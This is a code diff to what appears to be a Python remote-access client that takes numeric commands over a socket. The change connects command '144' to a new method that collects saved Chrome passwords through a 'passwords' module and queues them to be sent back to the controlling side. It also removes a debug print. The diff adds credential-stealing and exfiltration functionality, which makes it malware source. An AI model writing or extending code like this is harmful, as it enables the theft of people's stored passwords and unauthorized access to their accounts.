@@ -1,9 +1,9 @@
 import socket
 import signal
 import sys
-import util
 import threading, time
 from Queue import Queue
+import passwords
 
 def signal_handler(signal, frame):
         print('You pressed Ctrl+C!')
@@ -34,7 +34,7 @@ class Client:
             elif data == "143":
                 threading.Thread(target=self.screenshot).start()
             elif data == "144":
-                print "other thing"
+                threading.Thread(target=self.passwords).start()
             elif data == "145":
                 print "last thing"
             else:
@@ -74,7 +74,9 @@ class Client:
 
     def passwords(self):
         #TODO: Fill this in
-        return
+        message = passwords.getChromePasswords()
+        data = "\n".join(message)
+        self.enqueue(len(data),data)
 
     def enqueue(self,size,data):
         self.messageQ.put((size,data))
@@ -82,7 +84,6 @@ class Client:
     def dequeue(self):
         while True:
             data = self.messageQ.get()
-            print data[0]
             self.sendMessage(data[0],data[1])
 
     def sendMessage(self,size,data):
